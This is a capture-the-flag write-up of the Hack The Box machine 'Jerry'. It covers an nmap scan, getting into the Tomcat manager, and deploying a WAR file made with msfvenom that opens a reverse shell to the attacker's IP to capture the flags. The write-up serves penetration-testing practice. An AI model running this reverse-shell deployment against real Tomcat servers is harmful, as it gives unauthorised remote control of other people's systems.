![logo](/logo.png)

# [Jerry- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 30 Jun 2018 on HTB,Jerry created by [mrh4sh](https://app.hackthebox.com/users/2570).So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *Tomcat
  *War
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/jerry 10.10.10.95 -Pn
```

###### Output 

![](/Windows/Windows-Easy/Jerry/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/jerry 10.10.10.95 -Pn                                                                                       ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 19:21 EAT
Nmap scan report for 10.10.10.95
Host is up (0.32s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.86 seconds
```

looking at the results  we find out that there are 1 ports open and its a `JSP engine`and its running an `Apache Tomcat`. 

port[8080]-  http

looking at the port 8080 we find a landing page [http://10.10.10.95:8080](http://10.10.10.95:8080) a find an apache configuration document 

![](/Windows/Windows-Easy/Jerry/Screenshots/browser.png)

I managed App which directs to `manager/html` provides us with password and username

![](/Windows/Windows-Easy/Jerry/Screenshots/manager.png)

and am in the tomcat so let me find where to abuse tomcat from like how we did to ![Kotarak](/Linux/Linux-Hard/Kotarak/Kotarak.md)


![](/Windows/Windows-Easy/Jerry/Screenshots/tomcat.png)

lets abuse the manger `war` depoly 

A Web Application Resource (WAR) file is a single file container that holds all the potential files necessary for a Java-based web application. It can have Java Archives (.jar), Java Server Pages (.jsp), Java Servlets, Java classes, webpages, css, etc.

The `/WEB-INF` directory inside the archive is a special one, with a file named `web.xml` which defines the structure of the application.

Tomcat Manager makes it easy to deploy war files with a couple clicks, and since these can contain Java code, it’s a great target for gaining execution.

![](/Windows/Windows-Easy/Jerry/Screenshots/war.png)

```sh
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.11 lport=1337 -f war > leshack.war
```

![](/Windows/Windows-Easy/Jerry/Screenshots/msfvenom.png)

Then I click the file from here 

![](/Windows/Windows-Easy/Jerry/Screenshots/tomcatexploit.png)

and we get the shell

![](/Windows/Windows-Easy/Jerry/Screenshots/shell.png)

and since we are root we can get the the user and root flag

![](/Windows/Windows-Easy/Jerry/Screenshots/whoami.png)

we can navigate to `Desktop`

![](/Windows/Windows-Easy/Jerry/Screenshots/flags.png)

	-------------------------END successful attack @lesley----------------------

